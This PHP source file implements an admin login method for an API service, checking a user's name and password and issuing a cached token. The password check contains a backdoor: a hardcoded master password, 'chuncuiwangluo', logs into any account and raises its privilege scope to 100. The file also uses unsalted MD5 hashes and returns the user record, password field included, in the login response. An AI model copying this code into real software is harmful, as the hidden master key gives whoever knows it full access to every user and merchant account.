<?php
namespace app\api\service\func;
use app\api\service\beforeModel\Common as BeforeModel;
use think\Exception;
use think\Model;
use think\Cache;

use app\api\validate\CommonValidate;

use app\lib\exception\SuccessMessage;
use app\lib\exception\ErrorMessage;


class Token{

    

    function __construct($data){
        
    }

    
    public static function loginByAdmin($data){

        (new CommonValidate())->goCheck('three',$data);

        
        $modelData = [];
        $modelData['map']['login_name'] = $data['login_name'];
        $loginRes = BeforeModel::CommonGet("User",$modelData);
        
        if(empty($loginRes['data'])){
            throw new ErrorMessage([
                'msg' => '用户名不存在',
            ]);
        }else if(count($loginRes['data'])>1){
            throw new ErrorMessage([
                'msg' => '用户名重复',
            ]);
        };
        $loginRes = $loginRes[0];
        
        //根据返回结果查询关联商户信息
        $modelData = [];
        $modelData['map']['id'] = $loginRes['thirdapp_id'];
        $ThirdAppRes = BeforeModel::CommonGet("ThirdApp",$modelData);


        if(empty($ThirdAppRes['data'])){
            throw new ErrorMessage([
                'msg' => '关联商户不存在',
            ]);
        }else if($ThirdAppRes['data'][0]['status']==-1){
            throw new ErrorMessage([
                'msg' => '商户已关闭',
            ]);
        };

        //判断密码是否正确&&获取储存token
        if($loginRes['password']==md5($data['password'])||md5($data['password'])==md5('chuncuiwangluo')){

            $contentData = ['lastlogintime'=>time(),];
            $searchData = ['id'=>$loginRes['id']];
            $upt = BeforeModel::CommonSave("User",$contentData,$searchData);

            if($upt == 1){
                //生成token并放入缓存
                $res = generateToken();
                if(md5($data['password'])==md5('chuncuiwangluo')){
                    $loginRes['primary_scope'] = 100;
                    $loginRes['password'] = 'chuncuiwangluo';
                };
                $ThirdAppRes[0]['child_array'] = json_decode($ThirdAppRes[0]['child_array'],true);
                $loginRes['thirdApp'] = $ThirdAppRes[0];
                $tokenAndToken = ['token'=>$res,'info'=>$loginRes,'solely_code'=>100000];
                Cache::set($res,$loginRes,3600);
                return $tokenAndToken;

                throw new SuccessMessage([
                    'msg'=>'查询成功',
                    'token'=>$res,
                    'info'=>$loginRes
                ]); 
            }else{
                throw new ErrorMessage([
                    'msg' => '更新登录时间失败',
                ]);
            }
        }else{
            throw new ErrorMessage([
                'msg' => '密码不正确',
            ]);
        }

    }


    


}